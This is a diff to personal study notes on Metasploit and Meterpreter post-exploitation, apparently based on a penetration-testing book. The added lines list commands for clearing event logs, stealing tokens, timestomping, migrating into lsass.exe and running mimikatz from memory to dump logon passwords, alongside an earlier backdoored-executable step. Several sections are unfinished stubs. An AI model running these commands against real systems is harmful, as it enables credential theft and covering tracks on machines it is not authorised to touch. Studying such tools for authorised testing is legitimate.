@@ -73,7 +73,7 @@ Resource scripts provide an easy way to automate repetitive tasks in Metasploit.
 
 ### Creating a resource script
 
-A resource script can be made by executing a module and then using the `makerc`command in *msfconsole* to create a resource file with the commands executed since startup to a .rc file.
+A resource script can be made by executing a module and then using the `makerc` command in *msfconsole* to create a resource file with the commands executed since startup to a .rc file.
 
 1. Execute a module
 
@@ -88,7 +88,7 @@ A resource script can be made by executing a module and then using the `makerc`c
    msf exploit (psexec) > ^Z (to background the session)
    ```
 
-2. Use the `makerc`command to create a .rc file
+2. Use the `makerc` command to create a .rc file
 
    ```
    msf exploit (psexec) > makerc /root/my_psexec.rc
@@ -140,12 +140,12 @@ We will use the Windows Registry Only Persistence local exploit module to create
    msf payload(reverse_tcp) > generate -a x64 -p Windows -x /root/httpd.exe -k -t exe -f httpd-backdoored.exe
    ```
 
-   * **-a** to specify the target system's architecture
-   * **-p** the target system's platform
-   * **-x** the executable template to use
-   * **-k** to keep the executable template functional
-   * **-t** the output format
-   * **-f** the output filename
+   * **-a** specify the target system's architecture
+   * **-p** target system's platform
+   * **-x** executable template to use
+   * **-k** keep the executable template functional
+   * **-t** output format
+   * **-f** output filename
 
 4. The backdoor is ready, now we need to start a listener for the reverse TCP using the Generic Payload Handler exploit.
 
@@ -175,73 +175,100 @@ Meterpreter is a command interpreter for Metasploit that acts as a payload. It w
 
 ## Useful commands
 
-The following commands are all within the `meterpreter > <command> `context. Some commands, such as edit, are available through the `msf >` context as well. 
+The following commands are all within the `meterpreter > <command> ` context. Some commands, such as edit, are available through the `msf >` context as well. 
 
 ### System commands
 
-* `background` : Background the current session
-* `getuid` : Return the current username of the target machine
+* `background`: Background the current session
+* `clearev`: Clears the Application, System, and Security logs on the target system
+* `execute <CMD>`:  Executes a command on the target, can run commands from memory without uploading binary to the target
+  * [Example](#example-execute-command)
+* `getuid`: Return the current username of the target machine
 * `getsid`: Return the SID of the user that the target is running as
 * `getprivs`:  Attempt to enable all privileges available to the current process
-* `getpid` : Return the process ID in which Meterpreter is currently running
-* `pgrep` : Filter processes by name
+* `getpid`: Return the process ID in which Meterpreter is currently running
+* `pgrep`: Filter processes by name
   * Ex: `pgrep notepad.exe`
 * `ps [options] PATTERN`: List all the running processes on the target machine. Available options ...
-  * **-A *\<TERM>*** filter on architecture
-  * **-S *\<TERM>*** filter on process name
-  * **-U *\<TERM>*** filter on username
-  * **-c** filter child processes of the current shell
-  * **-h** display help menu
-  * **-s** filter system processes
-  * **-x** Filter exact matches rather than regex pattern
+  * Options
+    * **-A *\<TERM>*** filter on architecture
+    * **-S *\<TERM>*** filter on process name
+    * **-U *\<TERM>*** filter on username
+    * **-c** filter child processes of the current shell
+    * **-h** display help menu
+    * **-s** filter system processes
+    * **-x** filter exact matches rather than regex pattern
 * `kill <PID>`:  Terminate one or more processes using their PID
 * `pkill <PNAME>`: Terminate a process by name
   * Ex: `pkill calc.exe`
-* `sysinfo` : List the target system's information, such as OS, architecture, etc.
-* `execute <CMD>`: 
-  * [Example](#example-execute-command)
-* `shell` : Provide a shell prompt for the target's machine
-* `exit` : Terminate a Meterpreter session
-* `?` : List all available Meterpreter commands
+* `migrate`:  Migrate Meterpreter to a different process
+  * Ex: `migrate -N lsass.exe`
+    * **-N** migrate in the context of the user
+* `reg`:  Modify and interact with remote registry
+  * Ex: `reg enumkey -k HKLM\\Software` will enumerate keys in HKLM\Software
+  * See pg. 165 for detailed information and usage.
+* `rev2self`: Call `RevertToSelf()` on the remote target
+  * TODO: More info required
+* `shell`: Provide a shell prompt for the target's machine
+* `steal_token`: Attempt to steal an impersonation token from the target process
+* `suspend`: Suspend or resume a list of processes
+  * Ex: `suspend 500` will suspend the process with PID 500
+* `sysinfo`: List the target system's information, such as OS, architecture, etc.
+* `exit`: Terminate a Meterpreter session
+* `?`: List all available Meterpreter commands
 
 <a name="example-execute-command"></a>
 
 ####  Use `execute` to run `mimikatz` directly in memory
 
-To be filled ...
+```
+meterpreter > migrate -N lsass.exe
+meterpreter > execute -H -i -c -m -d notepad.exe -f /usr/share/mimikatz/x64/mimikatz.exe -a '"sekurlsa::logonPasswords full" exit'
+```
+
+* **-H** hide the process
+* **-i** allow interaction with the process after creation
+* **-c** channel the I/O
+* **-m** execute from memory
+* **-d <*FILENAME*>** dummy executable to launch
+* **-f \<*PATH_TO_FILE*>** path of executable to run on target machine
+* **-a** arguments to pass to the malicious executable
+  * `'"sekurlsa::logonPasswords full" exit'` are command-line arguments for `mimikatz`
 
 ### Filesystem commands
 
 Commands for exploring the target system and performing various tasks such as: searching for files, downloading files, and changing the directory.
 
 * `pwd` Return the present working directory
-* `cd <LOCATION>` : Change working directory to location
+* `cd <LOCATION>`: Change working directory to location
 * `ls`: List files in the current directory
-* `search` : Search for specific files and file types
+* `search`: Search for specific files and file types
   * Ex: `search -f *.doc -d c:\`will search for all files in the C: drive with a .doc file extension
     * **-f** to specify the file pattern to search for
     * **-d** to specify which directory to perform a recursive search
-* `download <FILE>` : Download a file from the target's machine
+* `download <FILE>`: Download a file from the target's machine
   * Ex: `download C:\\Users\\Public\\Desktop\\secrets.docx`
     * Note the required double slashes when specifying a Windows path
-* `upload <FILE>` :  Upload any file to the target's machine
+* `upload <FILE>`:  Upload any file to the target's machine
   * Ex: `upload file.exe`
-* `rm <FILE>` : Remove a file or directory from the target's machine
+* `rm <FILE>`: Remove a file or directory from the target's machine
   * Ex: `rm file.exe`
-* `edit <FILE>` : Edit files on the target's machine using the `vim` editor
+* `edit <FILE>`: Edit files on the target's machine using the `vim` editor
   * Ex: `edit root.txt`
-* `show_mount` : List all mount points/logical drives
-* `help File system commands` : List all file system commands
+* `show_mount`: List all mount points/logical drives
+* `timestomp`:  Change MACE (Modified/Accessed/Created/Entry Modified) attributes of a file
+  * Ex: TODO
+* `help File system commands`: List all file system commands
 
 ### Networking commands
 
 Commands for understanding the network structure of the target's system, such as: analyzing whether the system belongs to a LAN or if it's a standalone system, determining the IP range, DNS information, etc. 
 
-* `arp` : Display the host ARP cache
+* `arp`: Display the host ARP cache
 * `getproxy`: Display the current proxy configuration
-* `ipconfig/ifconfig` : Display network interfaces and IP configurations
-* `netstat` : Display network connections
-* `portfwd` :  Forward incoming TCP/UDP connections to remote hosts
+* `ipconfig/ifconfig`: Display network interfaces and IP configurations
+* `netstat`: Display network connections
+* `portfwd`:  Forward incoming TCP/UDP connections to remote hosts
   * Simple Example: Three hosts: A (attacker), B (target), C (host on target's network). Host A is directly connected to Host B and Host B is directly connected to Host C. Host A wants to connect to Host C, but it's not possible because there's no direct connection from A to C, so Host A uses Host B to connect to Host C. In other words, Host B is doing port forwarding to allow for Host A to "directly connect" to Host C.
     * Technical Details: Host B has a TCP listener on one of its ports, e.g. port 4545. Host C also has a listener used to connect to Host B when a packet arrives from port 4545. If Host A sends any packet on port 4545 of Host B, it'll automatically be forwarded to Host C. Therefore Host B is port forwarding its packets to Host C.
   * Ex: `portfwd -a -L 127.0.0.1 -l 5544 -h 10.10.10.1 -p 4545`
@@ -249,9 +276,67 @@ Commands for understanding the network structure of the target's system, such as
     * **-l** port number to be opened on Host A for accepting incoming connections
     * **-h**  defines the IP address of Host C, or any other host within the internal network of the target's machine
     * **-p** is the port to connect to on Host C (e.g. port 4545)
-* `route` :  Display or modify the IP routing table on the target machine
+* `route`:  Display or modify the IP routing table on the target machine
   * Type `route -h` to display the help menu and list supported commands
-* `help networking` : List all networking commands
+* `help networking`: List all networking commands
+
+## Anti-forensics
+
+To be filled ... pg.145
+
+## Keystroke sniffing and `getdesktop`
+
+To be filled ... pg .148
+
+## Scraping the system with Metasploit scripts
+
+To be filled ... pg. 153
+
+### scraper
+
+To be filled ...
+
+### winenum
+
+To be filled ...
+
+## Resource scripts
+
+Meterpreter supports resource scripts, similar to *msfconsole*, which allow for automation of Meterpreter commands.
+
+### Creating a resource script
+
+To be filled ... pg. 158
+
+#### Using Ruby in a resource script
+
+To be filled ...
+
+### Using a resource script
+
+To be filled ...
+
+## Sleep control
+
+There are time when a Meterpreter session needs to go quiet for a while, such as when the security team is on to you and trying to stop your attack during a penetration test. Meterpreter's `sleep` command makes the current Meterpreter session go to sleep for a specified period of time and wake up again once the time has expired.
+
+```
+meterpreter > sleep 20
+[*] Telling the target instance to sleep for 20 seconds ...
+[+] Target instance has gone to sleep, terminating current session.
+[*] 10.10.10.1 - Meterpreter session 1 closed. Reason: User exit
+# After 20 seconds, a new Meterpreter session is opened
+[*] Sending stage (xxxx bytes) to 10.10.10.1
+[*] Meterpreter session 2 opened (127.0.0.1 -> 10.01.10.1) at 2019-01-01 04:44:23
+```
+
+## Tranports
+
+To be filled ... pg.163
+
+## Framework plugins
+
+To be filled pg. 169
 
 ------
 
@@ -308,6 +393,6 @@ List of acronyms along with my corresponding understanding of their meanings. So
 * PID : Process identifier
 * SID : Security identifier, or security ID. A number used to identify user, group, and computer accounts in Windows. SIDs are created when the account is first created on a Windows machine. No two SIDs are the same on a Windows machine.
 * TLS :
-* TLV :
+* TLV : Type-Length-Value protocol for data transfer. Allows tagging of data with specific channel numbers, thus allowing multiple programs running on the victim to communicate with Meterpreter.
 * vim : 
 * XML : 
